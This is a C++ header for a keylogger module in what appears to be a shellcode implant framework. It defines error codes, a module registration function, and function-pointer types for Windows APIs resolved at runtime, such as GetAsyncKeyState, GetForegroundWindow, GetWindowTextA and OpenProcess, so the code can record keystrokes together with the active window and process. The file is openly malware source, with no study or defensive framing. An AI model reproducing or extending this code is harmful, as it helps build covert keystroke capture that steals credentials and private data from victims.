#include "shellcode.hpp"
#include <Psapi.h>

#define CUSTOM_MODULE_KEYLOGGER_FAIL_MALLOC_STRUCT 0x1001
#define CUSTOM_MODULE_KEYLOGGER_FAIL_GET_POINTERS 0x1002
#define CUSTOM_MODULE_KEYLOGGER_FAIL_REGISTER_MODULE 0x1003
#define ERROR_GET_POINTER_CUSTOM_MODULE_GETASYNCKEYSTATE 0x1004
#define ERROR_GET_POINTER_CUSTOM_MODULE_MAPVIRTUALKEYA 0x1005
#define ERROR_GET_POINTER_CUSTOM_MODULE_GETKEYNAMETEXTA 0x1006
#define ERROR_GET_POINTER_CUSTOM_MODULE_SLEEP 0x1007
#define ERROR_GET_POINTER_CUSTOM_MODULE_CLOSEHANDLE 0x100A
#define ERROR_GET_POINTER_CUSTOM_MODULE_GETLASTERROR 0x100B
#define ERROR_GET_POINTER_CUSTOM_MODULE_CREATETHREAD 0x100C
#define ERROR_GET_POINTER_CUSTOM_MODULE_GETFOREGROUNDWINDOW 0x100E
#define ERROR_GET_POINTER_CUSTOM_MODULE_GETWINDOWTEXTA 0x100F
#define ERROR_GET_POINTER_CUSTOM_MODULE_GETWINDOWTHREADPROCESSID 0x1010
#define ERROR_GET_POINTER_CUSTOM_MODULE_OPENPROCESS 0x1011
#define ERROR_GET_POINTER_CUSTOM_MODULE_GETMODULEFILENAMEEXA 0x1012
#define KEY_INFO_SIZE 128

DWORD RegisterModule_Keylogger(sh_context* ctx, uint32_t module_id);

using GetAsyncKeyState_t    = decltype(&GetAsyncKeyState);
using MapVirtualKeyA_t      = decltype(&MapVirtualKeyA);
using GetKeyNameTextA_t     = decltype(&GetKeyNameTextA);
using Sleep_t               = decltype(&Sleep);
using CloseHandle_t         = decltype(&CloseHandle);
using GetLastError_t        = decltype(&GetLastError);
using CreateThread_t        = decltype(&CreateThread);
using GetForegroundWindow_t = decltype(&GetForegroundWindow);
using GetWindowTextA_t      = decltype(&GetWindowTextA);
using GetWindowThreadProcessId_t = decltype(&GetWindowThreadProcessId);
using OpenProcess_t = decltype(&OpenProcess);
using GetModuleFileNameExA_t = decltype(&GetModuleFileNameExA);

struct keylogger_pointers {
    shared_func_pointers shared_fp;
    GetAsyncKeyState_t  fp_GetAsyncKeyState;
    MapVirtualKeyA_t    fp_MapVirtualKeyA;
    GetKeyNameTextA_t   fp_GetKeyNameTextA;
    Sleep_t             fp_Sleep;
    CloseHandle_t       fp_CloseHandle;
    GetLastError_t      fp_GetLastError;
    CreateThread_t      fp_CreateThread;
    GetForegroundWindow_t fp_GetForegroundWindow;
    GetWindowTextA_t    fp_GetWindowTextA;
    GetWindowThreadProcessId_t fp_GetWindowThreadProcessId;
    OpenProcess_t fp_OpenProcess;
    GetModuleFileNameExA_t fp_GetModuleFileNameExA;
};
